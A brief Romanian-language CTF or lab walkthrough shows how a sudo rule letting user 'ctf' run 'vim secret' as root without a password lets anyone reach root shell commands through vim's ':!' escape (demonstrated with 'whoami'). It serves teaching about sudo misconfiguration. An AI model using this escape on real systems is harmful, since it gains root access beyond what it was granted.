# Critical Thing

În urma execuției comenzii `sudo -l` observăm că userul `ctf` poate executa `vim secret` cu drepturi de sudo:

``` shell
$ sudo -l
Matching Defaults entries for ctf on fb2f5cf6e0aa:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ctf may run the following commands on fb2f5cf6e0aa:
    (root) NOPASSWD: /usr/bin/vim secret
```

În acest exemplu nu va fi important conținutul efectiv al fisierului `secret`.

Faptul că `vim` permite execuția de comenzi de shell este lucrul cu adevărat critic în configurația curentă.

Dacă un admin omite din vedere acest aspect, urmările pot fi catastrofale.

Executați următoarea comandă (nu omiteți `sudo`):

``` shell
sudo vim secret
```

După care executați:

```
:! whoami
```

Comanda anterioară execută comenzi de shell din interiorul `vim`.
Observați că acum putem executa comenzi de shell cu drepturi elevate.
